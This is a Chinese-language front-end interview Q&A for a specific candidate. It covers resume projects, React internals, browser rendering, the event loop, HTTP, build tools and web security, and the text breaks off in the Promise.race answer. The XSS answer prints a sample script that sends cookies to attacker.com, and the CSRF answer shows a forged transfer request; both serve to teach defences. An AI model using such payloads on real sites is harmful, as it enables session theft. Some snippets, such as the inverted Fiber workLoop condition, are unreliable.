# 腾讯PCG技术线-智能营销/AI小游戏方向 面试题（版本A）

> 候选人：谭成 | 针对简历项目深度挖掘 + 前端八股文 + 算法编程

---

## 1. 请详细介绍你在滴滴企业版商旅平台中参与的遗留系统重构工作，具体是如何将硬编码逻辑转化为配置驱动机制的？

## 答案

在滴滴企业版商旅平台的重构中，我主要参与了以下工作：

**问题背景**：
- 原有系统存在大量硬编码的业务规则（如定价逻辑、审批流程），导致每次业务变更都需要修改代码并重新部署
- 57个业务模块之间存在大量重复代码，维护成本高

**解决方案**：
1. **抽象通用定价模型**：将机票、酒店、火车票等不同品类的定价逻辑抽象为统一的定价模型接口，通过策略模式实现不同品类的差异化处理

2. **配置化改造**：
   - 引入 JSON Schema 定义业务规则结构
   - 将定价公式、审批条件、展示逻辑等抽取为可配置项
   - 通过可视化配置平台让产品/运营人员直接修改业务规则

3. **动态表单引擎**：
   - 基于 JSONSchema 自研动态表单引擎
   - 支持字段级权限控制、条件渲染、数据联动
   - 实现复杂业务场景的零代码扩展

**收益**：
- 业务迭代周期从 3-5 天缩短至 1 小时内
- 代码重复率降低约 60%
- 产品自主配置比例达到 80%+

---

## 2. 你自研的动态表单引擎基于 JSONSchema，请详细说明其架构设计和核心实现原理

## 答案

**架构设计**：

```
┌─────────────────────────────────────────────────────────┐
│                    配置层 (JSON Schema)                   │
├─────────────────────────────────────────────────────────┤
│  表单配置 │ 字段定义 │ 校验规则 │ 联动逻辑 │ 权限控制      │
├─────────────────────────────────────────────────────────┤
│                    解析层 (Schema Parser)                 │
├─────────────────────────────────────────────────────────┤
│  类型推导 │ 依赖分析 │ 条件编译 │ 默认值处理              │
├─────────────────────────────────────────────────────────┤
│                    渲染层 (Renderer Core)                 │
├─────────────────────────────────────────────────────────┤
│  组件映射 │ 布局引擎 │ 事件系统 │ 状态管理               │
├─────────────────────────────────────────────────────────┤
│                    组件库 (Component Lib)                 │
├─────────────────────────────────────────────────────────┤
│  Input │ Select │ DatePicker │ Cascader │ Custom         │
└─────────────────────────────────────────────────────────┘
```

**核心实现原理**：

1. **Schema 定义规范**：
```typescript
interface FormSchema {
  type: 'object';
  properties: Record<string, FieldSchema>;
  required?: string[];
  dependencies?: Record<string, string[]>; // 字段依赖
}

interface FieldSchema {
  type: 'string' | 'number' | 'boolean' | 'array' | 'object';
  title: string;
  widget?: string; // 组件类型
  rules?: ValidationRule[];
  visible?: string; // 条件表达式
  props?: Record<string, any>;
}
```

2. **条件渲染引擎**：
   - 使用表达式解析器（如 JSONLogic）处理 `visible`、`disabled` 等条件
   - 建立字段依赖图，实现联动更新
   - 支持异步数据源联动

3. **性能优化**：
   - 字段级细粒度更新（类似 React.memo）
   - 虚拟滚动处理大量表单项
   - 按需加载复杂组件

---

## 3. 你在滴滴参与了 AI Native 转型，请具体说明 OpenSpec 和 SSD 规范是如何定义的？AI 如何辅助代码生成？

## 答案

**OpenSpec 定义**：

OpenSpec 是我们团队定义的一套结构化开发规范，用于标准化 AI 辅助开发：

```yaml
# OpenSpec 示例
spec_version: "1.0"
component:
  name: "BusinessForm"
  type: "form"
  props:
    - name: "schema"
      type: "FormSchema"
      required: true
    - name: "onSubmit"
      type: "(values: any) => Promise<void>"
  
  ai_prompts:
    generate: |
      基于以下业务需求生成表单组件：
      需求：{{requirement}}
      请生成符合 SSD 规范的 React + TypeScript 代码
    
    refactor: |
      分析以下代码，按 SSD 规范重构：
      代码：{{code}}
      要求：{{requirements}}
```

**SSD 规范（Structured Skill Definition）**：

SSD 是面向 AI 的结构化技能定义模式：

1. **技能封装标准**：
```typescript
interface SkillDefinition {
  id: string;
  name: string;
  description: string;
  input: z.ZodSchema; // 输入参数校验
  output: z.ZodSchema; // 输出格式
  examples: Example[]; // Few-shot 示例
  constraints: string[]; // 约束条件
}
```

2. **代码生成流程**：
   - 需求输入 → Prompt 工程 → LLM 生成 → 代码校验 → 输出
   - 引入 RAG 检索历史优秀代码作为参考
   - 自动单元测试生成与验证

**AI 辅助代码生成实践**：

- **组件生成**：输入业务描述，AI 生成符合规范的组件代码
- **重构建议**：代码审查时 AI 自动识别坏味道并给出重构方案
- **文档同步**：代码变更自动更新注释和文档

---

## 4. GResume 项目中使用 Automerge (CRDT) 实现实时协作，请解释 CRDT 如何解决并发冲突问题？

## 答案

**CRDT 核心原理**：

CRDT（Conflict-free Replicated Data Type，无冲突复制数据类型）通过数学设计保证：
- **交换律**：A 合并 B = B 合并 A
- **结合律**：(A 合并 B) 合并 C = A 合并 (B 合并 C)
- **幂等性**：A 合并 A = A

**Automerge 实现机制**：

1. **操作转换（OT 的替代）**：
   - 不转换操作，而是记录所有操作历史
   - 每个操作带有唯一 ID（ActorID + 序列号）
   - 合并时按因果顺序应用操作

2. **并发冲突处理**：
```javascript
// 场景：两人同时编辑同一行
// 用户A：将 "Hello" 改为 "Hi"
// 用户B：将 "Hello" 改为 "Hey"

// Automerge 处理：
// 1. 识别并发操作（无因果关系）
// 2. 保留两个值，标记为冲突
// 3. 应用层决定展示策略（如显示多个值供选择）

const doc = Automerge.change(doc, d => {
  d.content = "Hi"; // 用户A的操作
});

const doc2 = Automerge.change(doc, d => {
  d.content = "Hey"; // 用户B的操作（基于同一版本）
});

// 合并时
const merged = Automerge.merge(doc, doc2);
// merged.content 可能是多值状态，需应用层处理
```

3. **GResume 中的四层同步架构**：
   - **本地层**：Zustand 管理本地状态
   - **CRDT 层**：Automerge 处理冲突
   - **网络层**：WebSocket 传输操作
   - **持久层**：IndexedDB + 后端存储

---

## 5. 在 GResume 的实时协作系统中，Zustand + CRDT + IndexedDB 的三步模型是如何设计的？

## 答案

**三步模型设计**：

```
用户操作
   ↓
┌─────────────────────────────────────────────────────────────┐
│ Step 1: 乐观更新 (Optimistic Update)                          │
│ • Zustand 立即更新本地状态                                     │
│ • UI 即时响应，无延迟                                          │
│ • 操作记录到 pending 队列                                      │
└─────────────────────────────────────────────────────────────┘
   ↓
┌─────────────────────────────────────────────────────────────┐
│ Step 2: CRDT 同步 (CRDT Sync)                                │
│ • 将操作转换为 CRDT 操作                                       │
│ • 本地应用并生成变更记录                                        │
│ • 广播给其他客户端                                            │
│ • 接收远程变更并合并                                           │
└─────────────────────────────────────────────────────────────┘
   ↓
┌─────────────────────────────────────────────────────────────┐
│ Step 3: 延迟持久化 (Deferred Persistence)                     │
│ • 批量写入 IndexedDB（防抖处理）                               │
│ • 网络恢复时同步到服务器                                       │
│ • 冲突解决后清理 pending 队列                                  │
└─────────────────────────────────────────────────────────────┘
```

**代码实现要点**：

```typescript
// Zustand Store 设计
interface ResumeState {
  doc: Automerge.Doc<ResumeData>;
  pendingOps: Operation[];
  syncStatus: 'synced' | 'syncing' | 'offline';
  
  // Step 1: 乐观更新
  updateField: (path: string, value: any) => void;
  
  // Step 2: CRDT 同步
  applyLocalChange: (change: Change) => void;
  applyRemoteChanges: (changes: Change[]) => void;
  
  // Step 3: 持久化
  persistToIndexedDB: () => Promise<void>;
  syncToServer: () => Promise<void>;
}

// 中间件实现
const crdtMiddleware = (config) => (set, get, api) => {
  return config(
    (args) => {
      // Step 1: 立即更新
      set(args);
      
      // Step 2: 异步 CRDT 处理
      const state = get();
      processCRDTChange(state.doc, args);
      
      // Step 3: 防抖持久化
      debouncedPersist(state);
    },
    get,
    api
  );
};
```

**离线支持**：
- 断网时操作存储在 IndexedDB
- 网络恢复后按序重放操作
- 使用向量时钟检测和解决冲突

---

## 6. 请解释 React Fiber 架构的核心设计思想，以及它如何解决 React 15 时代的栈递归问题

## 答案

**React 15 栈递归的问题**：

```
// 旧架构：同步递归渲染
updateQueue → 递归遍历组件树 → 一次性完成所有工作
                    ↓
            主线程被阻塞
                    ↓
            动画卡顿、输入延迟
```

问题：
- 组件树过大时，JS 执行时间过长（>16ms）
- 无法中断渲染，高优先级更新（如用户输入）被延迟

**React Fiber 核心设计**：

1. **链表结构替代递归**：
```javascript
// Fiber 节点结构
interface FiberNode {
  type: any;           // 组件类型
  key: string | null;
  stateNode: any;      // DOM 节点或组件实例
  
  // 链表指针
  child: FiberNode | null;   // 第一个子节点
  sibling: FiberNode | null; // 下一个兄弟节点
  return: FiberNode | null;  // 父节点
  
  // 工作单元相关
  pendingProps: any;
  memoizedState: any;
  effectTag: number;    // 副作用标记
  nextEffect: FiberNode | null;
}
```

2. **增量渲染（Time Slicing）**：
```javascript
// 工作循环
function workLoop(deadline) {
  while (nextUnitOfWork && !deadline.timeRemaining()) {
    nextUnitOfWork = performUnitOfWork(nextUnitOfWork);
  }
  
  if (nextUnitOfWork) {
    // 让出主线程
    requestIdleCallback(workLoop);
  } else {
    // 提交阶段
    commitRoot();
  }
}
```

3. **优先级调度**：
```javascript
// 优先级等级
const priorities = {
  NoPriority: 0,
  ImmediatePriority: 1,    // 用户输入、点击
  UserBlockingPriority: 2, // 动画
  NormalPriority: 3,       // 普通更新
  LowPriority: 4,          // 数据预取
  IdlePriority: 5,         // 离线分析
};
```

**双缓冲技术**：
- `current`：当前屏幕显示的 Fiber 树
- `workInProgress`：正在构建的新 Fiber 树
- 渲染完成后，指针切换（`root.current = workInProgress`）

---

## 7. React Hooks 的底层实现原理是什么？为什么不能在循环或条件语句中调用 Hooks？

## 答案

**Hooks 底层实现**：

```javascript
// 简化版实现
const React = (function() {
  let hooks = [];      // 存储所有 state
  let idx = 0;         // 当前 hook 的索引
  
  function useState(initialValue) {
    const state = hooks[idx] !== undefined ? hooks[idx] : initialValue;
    hooks[idx] = state;
    
    const _idx = idx;  // 闭包保存索引
    idx++;             // 下一个 hook 的索引
    
    function setState(newValue) {
      hooks[_idx] = newValue;
      render();        // 触发重新渲染
    }
    
    return [state, setState];
  }
  
  function render(Component) {
    idx = 0;           // 每次渲染重置索引
    const comp = Component();
    comp.render();
    return comp;
  }
  
  return { useState, render };
})();
```

**为什么不能放在循环/条件中**：

```javascript
function BadComponent({ condition }) {
  // ❌ 错误：条件调用
  if (condition) {
    const [state, setState] = useState(0);
  }
  
  // ❌ 错误：循环调用
  for (let i = 0; i < 3; i++) {
    const [item, setItem] = useState(i);
  }
  
  const [count, setCount] = useState(0); // 索引错乱！
}
```

**问题分析**：

| 渲染次数 | 正常调用 | 条件调用（condition=false） |
|---------|---------|---------------------------|
| 第1次   | idx=0: useState(0) | idx=0: 跳过 |
|         | idx=1: useState('a') | idx=0: useState('a') ← 索引错乱！|
| 第2次   | idx=0: 复用 state | idx=0: 执行 ← 索引再次错乱 |

Hooks 依赖调用顺序来正确关联状态和组件，条件/循环会破坏这个顺序。

**正确做法**：
```javascript
function GoodComponent({ condition }) {
  const [state, setState] = useState(0);  // 始终在顶层
  const [list, setList] = useState([]);   // 顺序固定
  
  // 条件逻辑放在 hook 内部
  const displayedState = condition ? state : null;
}
```

---

## 8. 请详细解释浏览器渲染机制，从输入 URL 到页面显示的全过程

## 答案

**完整流程**：

```
输入 URL
   ↓
DNS 解析 → 获取 IP 地址
   ↓
建立 TCP 连接（三次握手）
   ↓
TLS/SSL 握手（HTTPS）
   ↓
发送 HTTP 请求
   ↓
服务器响应
   ↓
┌────────────────────────────────────────┐
│           浏览器渲染流水线               │
├────────────────────────────────────────┤
│ 1. 解析 HTML → DOM 树                  │
│ 2. 解析 CSS → CSSOM 树                 │
│ 3. DOM + CSSOM → Render Tree           │
│ 4. Layout（布局/重排）                  │
│ 5. Paint（绘制/重绘）                   │
│ 6. Composite（合成）                    │
└────────────────────────────────────────┘
   ↓
页面显示
```

**关键阶段详解**：

**1. DOM 构建**：
```javascript
// HTML 解析是增量进行的
// 遇到 <script> 会阻塞解析（除非 defer/async）
<html>
  <head>
    <script src="a.js"></script>  <!-- 阻塞 -->
    <script src="b.js" defer></script>  <!-- 不阻塞，DOM 解析后执行 -->
    <script src="c.js" async></script>  <!-- 不阻塞，下载完立即执行 -->
  </head>
</html>
```

**2. CSSOM 构建**：
- CSS 解析不会阻塞 HTML 解析
- 但会阻塞 Render Tree 构建（需要完整 CSSOM）
- 这就是为什么 CSS 建议放在 `<head>`

**3. Render Tree**：
- 只包含可见节点（`display: none` 排除，`visibility: hidden` 包含）
- 计算每个节点的样式（Computed Style）

**4. Layout（重排）**：
```javascript
// 触发重排的操作（代价高）
element.offsetHeight;  // 强制同步布局（Forced Synchronous Layout）
element.style.width = '100px';
element.style.height = '200px';  // 两次重排！

// 优化：批量修改
const width = '100px';
const height = '200px';
element.style.cssText = `width: ${width}; height: ${height};`;  // 一次重排
```

**5. Paint & Composite**：
- Paint：将 Render Tree 绘制成图层（Layer）
- Composite：GPU 合成图层，生成最终画面
- `transform` 和 `opacity` 只触发 Composite，性能最好

---

## 9. JavaScript 事件循环（Event Loop）的执行机制是什么？宏任务和微任务的区别和优先级？

## 答案

**事件循环核心机制**：

```
┌─────────────────────────────────────────────────────────────┐
│                        Call Stack                           │
│                   （执行栈，单线程执行）                        │
└─────────────────────────────────────────────────────────────┘
                              ↑
                              │ 执行完毕
┌─────────────────────────────────────────────────────────────┐
│  ┌─────────────┐    ┌─────────────┐    ┌─────────────────┐  │
│  │  Microtask  │    │  Microtask  │    │   Microtask     │  │
│  │    Queue    │ →  │   Queue     │ →  │    Queue        │  │
│  │  (微任务队列) │    │  (nextTick) │    │ (MutationObserver)│  │
│  └─────────────┘    └─────────────┘    └─────────────────┘  │
│         ↑                                                   │
│    Promise.then,                                              │
│    queueMicrotask,                                            │
│    async/await                                                │
└─────────────────────────────────────────────────────────────┘
                              ↑
                              │ 微任务清空后
┌─────────────────────────────────────────────────────────────┐
│  ┌─────────────┐    ┌─────────────┐    ┌─────────────────┐  │
│  │  Macrotask  │ →  │  Macrotask  │ →  │    Macrotask    │  │
│  │    Queue    │    │    Queue    │    │     Queue       │  │
│  │  (宏任务队列) │    │             │    │                 │  │
│  └─────────────┘    └─────────────┘    └─────────────────┘  │
│         ↑                                                   │
│    setTimeout,                                                │
│    setInterval,                                               │
│    setImmediate,                                              │
│    I/O, UI rendering                                          │
└─────────────────────────────────────────────────────────────┘
```

**执行顺序**：

1. 执行同步代码（Call Stack）
2. 执行所有微任务（Microtask Queue）
3. 执行一个宏任务（Macrotask Queue）
4. 重复步骤 2-3

**代码示例**：

```javascript
console.log('1');  // 同步

setTimeout(() => {
  console.log('2');  // 宏任务
  Promise.resolve().then(() => {
    console.log('3');  // 微任务（在宏任务中产生）
  });
}, 0);

Promise.resolve().then(() => {
  console.log('4');  // 微任务
  setTimeout(() => {
    console.log('5');  // 宏任务（在微任务中产生）
  }, 0);
});

console.log('6');  // 同步

// 输出顺序：1 → 6 → 4 → 2 → 3 → 5
```

**微任务 vs 宏任务**：

| 特性 | 微任务 | 宏任务 |
|-----|-------|-------|
| 优先级 | 高 | 低 |
| 执行时机 | 当前任务结束后立即执行 | 下一轮事件循环 |
| 典型 API | Promise.then, queueMicrotask, MutationObserver | setTimeout, setInterval, I/O |
| 风险 | 递归微任务可能阻塞渲染 | 相对安全 |

---

## 10. TypeScript 中的泛型（Generic）是什么？请举例说明协变、逆变和双向协变

## 答案

**泛型基础**：

```typescript
// 泛型函数
function identity<T>(arg: T): T {
  return arg;
}

// 泛型接口
interface GenericResponse<T> {
  data: T;
  code: number;
  message: string;
}

// 泛型约束
interface HasLength {
  length: number;
}
function logLength<T extends HasLength>(arg: T): T {
  console.log(arg.length);
  return arg;
}
```

**型变（Variance）**：

```typescript
// 定义类型层次
class Animal {
  name: string = '';
}

class Dog extends Animal {
  bark() {}
}

class Corgi extends Dog {
  cute() {}
}
```

**协变（Covariant）**：子类型可以赋值给父类型
```typescript
// 数组是协变的
let animals: Animal[] = [];
let dogs: Dog[] = [new Dog()];

animals = dogs;  // ✓ 协变：Dog[] 可以赋值给 Animal[]
// animals[0] = new Animal();  // ✗ 危险！会破坏 dogs 的类型安全
```

**逆变（Contravariant）**：父类型可以赋值给子类型
```typescript
// 函数参数是逆变的
type AnimalHandler = (animal: Animal) => void;
type DogHandler = (dog: Dog) => void;

let handleAnimal: AnimalHandler = (a) => console.log(a.name);
let handleDog: DogHandler = (d) => d.bark();

handleDog = handleAnimal;  // ✓ 逆变：AnimalHandler 可以赋值给 DogHandler
// 因为 handleAnimal 接收 Animal，当然也能接收 Dog

// handleAnimal = handleDog;  // ✗ 错误！handleDog 期望 Dog，不能接收 Cat
```

**双向协变（Bivariant）**：
```typescript
// TypeScript 对函数参数默认是双向协变的（--strictFunctionTypes 关闭时）
// 开启严格模式后，函数参数变为逆变

// 方法参数（非严格模式下双向协变）
interface EventHandler {
  handle(event: Event): void;
}

// 不变（Invariant）
```

**实际应用**：
```typescript
// 协变：只读数据结构
interface ReadonlyContainer<out T> {
  getValue(): T;
}

// 逆变：只写数据结构
interface WriteonlyContainer<in T> {
  setValue(value: T): void;
}

// 不变：读写数据结构
interface Container<T> {
  getValue(): T;
  setValue(value: T): void;
}
```

---

## 11. 什么是闭包（Closure）？请说明其原理、应用场景和可能导致的内存泄漏问题

## 答案

**闭包原理**：

闭包是指函数能够记住并访问其词法作用域，即使该函数在其词法作用域之外执行。

```javascript
function outer() {
  let count = 0;  // 被闭包引用的变量
  
  function inner() {
    count++;      // 访问外部函数的变量
    return count;
  }
  
  return inner;
}

const counter = outer();  // outer 执行完毕，但 count 未被回收
console.log(counter());   // 1
console.log(counter());   // 2
```

**内存模型**：

```
执行 outer() 时：
┌─────────────────────────────────────┐
│  outer 执行上下文                    │
│  - count: 0 (堆内存，被 inner 引用)   │
│  - inner 函数定义                    │
└─────────────────────────────────────┘
           ↓
outer 执行完毕，执行上下文弹出栈
           ↓
但 count 仍在堆内存中（被返回的 inner 引用）
           ↓
counter() 调用时，通过作用域链找到 count
```

**应用场景**：

1. **数据私有化**：
```javascript
const createCounter = () => {
  let count = 0;
  return {
    increment: () => ++count,
    decrement: () => --count,
    getCount: () => count
  };
};
// count 无法从外部直接访问
```

2. **函数柯里化**：
```javascript
const add = (a) => (b) => a + b;
const add5 = add(5);  // 闭包保存 a=5
add5(3);  // 8
```

3. **防抖/节流**：
```javascript
function debounce(fn, delay) {
  let timer;  // 闭包保存 timer
  return function(...args) {
    clearTimeout(timer);
    timer = setTimeout(() => fn.apply(this, args), delay);
  };
}
```

**内存泄漏风险**：

```javascript
// ❌ 问题：意外闭包导致大对象无法回收
function processData() {
  const hugeData = new Array(1000000).fill('x');
  
  return function() {
    console.log('processed');  // 没有引用 hugeData，但...
  };
}

// V8 优化后可能回收，但某些引擎会保留整个作用域

// ✅ 解决方案：显式解除引用
function processDataSafe() {
  const hugeData = new Array(1000000).fill('x');
  const result = process(hugeData);
  
  return function() {
    console.log(result);  // 只引用需要的结果
  };
}

// ❌ React 中的闭包陷阱
function Component() {
  const [count, setCount] = useState(0);
  
  useEffect(() => {
    const timer = setInterval(() => {
      console.log(count);  // 永远输出 0（闭包陷阱）
    }, 1000);
    return () => clearInterval(timer);
  }, []);  // 依赖数组为空，count 永远是初始值
}
```

---

## 12. 请解释 HTTP/1.1、HTTP/2 和 HTTP/3 的主要区别，以及 HTTP/2 的多路复用是如何实现的

## 答案

**版本对比**：

| 特性 | HTTP/1.1 | HTTP/2 | HTTP/3 |
|-----|---------|--------|--------|
| 传输层 | TCP | TCP | QUIC (UDP) |
| 连接数 | 6-8 个并行连接 | 单一连接多路复用 | 单一连接多路复用 |
| 队头阻塞 | 存在 | 解决（应用层） | 解决（传输层） |
| 头部压缩 | 无 | HPACK | QPACK |
| 服务器推送 | 无 | 支持 | 支持 |
| 加密 | 可选 | 强制 TLS | 强制 TLS 1.3 |

**HTTP/1.1 的问题**：

```
浏览器限制每个域名 6-8 个并发连接

请求1 ────────────────────────────────→
响应1 ←───────────────────────────────
请求2 ────────────────────────────────→  队头阻塞！
响应2 ←───────────────────────────────
```

**HTTP/2 多路复用**：

```
单一 TCP 连接

Stream 1: ──────┐
Stream 3: ──────┼──────→ 帧交错传输
Stream 5: ──────┘
Stream 7: ──────┐
                ↓
        ┌───────────────┐
        │  Binary Framing │
        │    Layer        │
        └───────────────┘
                ↓
        帧重新组装成完整消息
```

**实现细节**：

1. **二进制分帧层**：
   - 将请求/响应分割为更小的帧（Frame）
   - 帧头部包含：长度、类型、标志、流标识符

```
帧结构：
+-----------------------------------------------+
| Length (24) | Type (8) | Flags (8) |          |
+-----------------------------------------------+
|R| Stream Identifier (31) |                    |
+-----------------------------------------------+
| Payload (变长) ...                             |
+-----------------------------------------------+
```

2. **Stream 优先级**：
```javascript
// 客户端可以指定资源优先级
// 主文档：优先级高
// 图片：优先级中
// 分析脚本：优先级低
```

3. **HPACK 头部压缩**：
   - 静态表：预定义常用头部字段
   - 动态表：连接级别的自定义表
   - Huffman 编码：压缩字符串

**HTTP/3 的改进**：

```
HTTP/2 的问题：TCP 层队头阻塞

TCP 包1 丢失 ──→ 等待重传 ──→ 阻塞后续所有 Stream

HTTP/3 解决方案：QUIC 基于 UDP

Stream 1: 独立传输，丢包不影响 Stream 2
Stream 2: 独立传输
Stream 3: 独立传输

连接迁移：连接 ID 标识，IP 变化不影响连接
```

---

## 13. 前端性能优化有哪些手段？请从加载优化、渲染优化和运行时优化三个维度说明

## 答案

**加载优化**：

```javascript
// 1. 资源压缩与合并
// - JS/CSS 压缩（Terser、cssnano）
// - Tree Shaking 消除死代码
// - 代码分割（Code Splitting）

// 2. 懒加载
const LazyComponent = React.lazy(() => import('./HeavyComponent'));

// 图片懒加载
<img loading="lazy" src="image.jpg" />

// 3. 预加载关键资源
<link rel="preload" href="critical.css" as="style">
<link rel="prefetch" href="next-page.js">  // 低优先级预取

// 4. 使用 CDN 和缓存
// - 静态资源 CDN 分发
// - HTTP 缓存策略（Cache-Control、ETag）
```

**渲染优化**：

```javascript
// 1. 减少重排重绘
// 批量修改样式
const el = document.getElementById('box');
el.style.cssText = 'width: 100px; height: 100px;';

// 或使用 CSS 类
el.classList.add('resize');

// 2. 使用 transform 和 opacity（GPU 加速）
// ✅ 只触发 Composite
el.style.transform = 'translateX(100px)';
el.style.opacity = '0.5';

// ❌ 触发 Layout + Paint
el.style.left = '100px';
el.style.width = '200px';

// 3. 虚拟列表
import { FixedSizeList } from 'react-window';
<FixedSizeList
  height={500}
  itemCount={10000}
  itemSize={50}
>
  {Row}
</FixedSizeList>

// 4. 防抖和节流
// 防抖：搜索输入
// 节流：滚动事件
```

**运行时优化**：

```javascript
// 1. 使用 Web Workers 处理耗时任务
const worker = new Worker('heavy-task.js');
worker.postMessage({ data: largeArray });
worker.onmessage = (e) => {
  console.log('Result:', e.data);
};

// 2. 内存管理
// 及时清理事件监听
useEffect(() => {
  const handler = () => {};
  window.addEventListener('scroll', handler);
  return () => window.removeEventListener('scroll', handler);
}, []);

// 3. 缓存计算结果（Memoization）
const memoizedValue = useMemo(() => {
  return expensiveComputation(a, b);
}, [a, b]);

const memoizedCallback = useCallback(() => {
  doSomething(a, b);
}, [a, b]);

// 4. 使用 requestIdleCallback 执行低优先级任务
requestIdleCallback((deadline) => {
  while (deadline.timeRemaining() > 0 && tasks.length > 0) {
    performTask(tasks.shift());
  }
});
```

---

## 14. Webpack 和 Vite 的区别是什么？Vite 为什么开发环境启动更快？

## 答案

**核心区别**：

| 特性 | Webpack | Vite |
|-----|---------|------|
| 开发模式 | 打包后服务 | 原生 ESM，按需编译 |
| 构建速度 | 慢（全量打包） | 快（esbuild 预构建） |
| HMR | 更新慢 | 极快（基于 ESM） |
| 配置复杂度 | 复杂 | 简单 |
| 生产构建 | 高度优化 | Rollup 打包 |

**Webpack 开发模式**：

```
启动过程：
1. 扫描入口文件
2. 递归解析依赖树
3. 将所有模块打包成 bundle.js
4. 启动 dev server

问题：项目越大，打包时间越长（可能几十秒）
```

**Vite 开发模式**：

```
启动过程：
1. 启动 dev server（几乎瞬间）
2. 浏览器请求 index.html
3. 浏览器解析 <script type="module">
4. 按需请求模块（原生 ESM）
5. Vite 拦截请求，按需编译

优化：
- 依赖预构建（esbuild）：将 CommonJS 转为 ESM
- 源码按需编译：只编译当前页面需要的模块
```

**Vite 快的原因**：

1. **esbuild 预构建**：
   - Go 语言编写，比 JavaScript 快 10-100 倍
   - 将 `node_modules` 中的依赖转为 ESM 格式

2. **原生 ESM**：
```javascript
// 浏览器直接支持
<script type="module">
  import { createApp } from '/@fs/node_modules/vue/dist/vue.esm-browser.js';
</script>
```

3. **HMR 优化**：
```
Webpack HMR：
修改文件 → 重新打包 → 浏览器刷新 → 状态丢失

Vite HMR：
修改文件 → 精确推送变更模块 → 局部更新 → 状态保持
```

**代码示例**：

```javascript
// vite.config.js
import { defineConfig } from 'vite';
import react from '@vitejs/plugin-react';

export default defineConfig({
  plugins: [react()],
  optimizeDeps: {
    include: ['lodash-es', 'react', 'react-dom'],  // 预构建
  },
  build: {
    rollupOptions: {
      output: {
        manualChunks: {
          vendor: ['react', 'react-dom'],
        },
      },
    },
  },
});
```

---

## 15. 什么是 XSS 和 CSRF 攻击？如何防范？

## 答案

**XSS（跨站脚本攻击）**：

```javascript
// 攻击示例：存储型 XSS
// 攻击者在评论区提交：
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>

// 其他用户查看评论时，脚本执行，Cookie 被盗
```

**XSS 类型**：

| 类型 | 描述 | 示例 |
|-----|------|------|
| 存储型 | 恶意脚本存储在服务器 | 评论区、文章 |
| 反射型 | 恶意脚本在 URL 中 | 诱导点击链接 |
| DOM 型 | 前端 JS 操作 DOM 导致 | 不安全的 innerHTML |

**XSS 防范**：

```javascript
// 1. 输入过滤和转义
// 使用 DOMPurify 等库
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(dirtyHTML);

// 2. React/Vue 自动转义
// React 默认转义 JSX 中的内容
const userInput = '<script>alert(1)</script>';
// 渲染为纯文本，不执行

// 3. CSP（内容安全策略）
// HTTP 响应头
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123';

// 4. HttpOnly Cookie
Set-Cookie: session=xxx; HttpOnly; Secure; SameSite=Strict
// JavaScript 无法读取 HttpOnly Cookie
```

**CSRF（跨站请求伪造）**：

```html
<!-- 攻击示例 -->
<!-- 用户已登录 bank.com，Cookie 有效 -->
<!-- 攻击者网站诱导用户访问： -->
<img src="https://bank.com/transfer?to=attacker&amount=10000" />
<!-- 浏览器自动携带 Cookie，请求成功 -->
```

**CSRF 防范**：

```javascript
// 1. CSRF Token
// 服务端生成 Token，嵌入表单
<form action="/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="随机值" />
</form>

// 2. SameSite Cookie
Set-Cookie: session=xxx; SameSite=Strict;
// Strict: 完全禁止第三方 Cookie
// Lax: 允许 GET 请求（默认）

// 3. 验证 Origin/Referer
const origin = request.headers.origin;
if (origin !== 'https://bank.com') {
  return reject();
}

// 4. 双重 Cookie 验证
// 随机值同时存在 Cookie 和请求参数中
fetch('/api/action', {
  headers: {
    'X-CSRF-Token': getCookie('csrf_token'),
  },
});
```

---

## 16. 请解释 CSS 的 BFC（块级格式化上下文）及其应用场景

## 答案

**BFC 定义**：

BFC（Block Formatting Context，块级格式化上下文）是 Web 页面中一块独立的渲染区域，内部元素的布局不会影响外部元素。

**创建 BFC 的条件**：

```css
/* 以下任一属性可创建 BFC */
.container {
  /* 1. 根元素（<html>） */
  
  /* 2. float 不为 none */
  float: left | right;
  
  /* 3. position 为 absolute 或 fixed */
  position: absolute | fixed;
  
  /* 4. display 为 inline-block | table-cell | flex | grid 等 */
  display: inline-block;
  display: flex;
  display: grid;
  
  /* 5. overflow 不为 visible */
  overflow: hidden | auto | scroll;
  
  /* 6. 最新属性 */
  contain: layout | content | paint;
}
```

**BFC 特性**：

1. **内部元素垂直排列**
2. **元素间距由 margin 决定，相邻元素 margin 会重叠**
3. **BFC 区域不会与浮动元素重叠**
4. **计算高度时，浮动元素也参与计算**

**应用场景**：

**1. 清除浮动**：
```html
<div class="parent">
  <div class="float-left">浮动元素</div>
</div>
```
```css
.parent {
  overflow: hidden;  /* 创建 BFC，包含浮动子元素 */
}
/* 或使用 .clearfix */
.clearfix::after {
  content: '';
  display: table;
  clear: both;
}
```

**2. 防止 margin 重叠**：
```html
<div class="bfc">
  <div class="box" style="margin-bottom: 20px;">Box 1</div>
</div>
<div class="bfc">
  <div class="box" style="margin-top: 20px;">Box 2</div>
</div>
<!-- 两个 BFC 隔离，margin 不会重叠 -->
```

**3. 自适应两栏布局**：
```css
.left {
  float: left;
  width: 200px;
}
.right {
  overflow: hidden;  /* 创建 BFC，避开浮动元素 */
}
```

```html
<div class="left">固定宽度</div>
<div class="right">自适应宽度，不会与左侧重叠</div>
```

---

## 17. 请手写实现 Promise.all 和 Promise.race

## 答案

**Promise.all**：

```javascript
function promiseAll(promises) {
  return new Promise((resolve, reject) => {
    // 处理空数组
    if (promises.length === 0) {
      resolve([]);
      return;
    }
    
    const results = new Array(promises.length);
    let completedCount = 0;
    
    promises.forEach((promise, index) => {
      // 将非 Promise 值包装为 Promise
      Promise.resolve(promise)
        .then(value => {
          results[index] = value;
          completedCount++;
          
          // 所有 Promise 完成
          if (completedCount === promises.length) {
            resolve(results);
          }
        })
        .catch(reject);  // 任一失败则整体失败
    });
  });
}

// 测试
const p1 = Promise.resolve(1);
const p2 = new Promise(resolve => setTimeout(() => resolve(2), 100));
const p3 = 3;  // 非 Promise 值

promiseAll([p1, p2, p3]).then(console.log);  // [1, 2, 3]
```

**Promise.race**：

```javascript
function promiseRace(promises) {
  return new Promise((resolve, reject) => {
    // 处理空数组
    if (promises.length === 0) {
      return;  // 永远处于 pending 状态
    }
    
    promises.forEach(promise => {
      Promise.resolve(promise)
        .then(resolve)    // 任一成功则整体成功
        .catch(reject);   // 任一失败则整体失败
    });
  });
}

// 测试
const p1 = new Promise(resolve => setTimeout(() => resolve('p1'), 200));
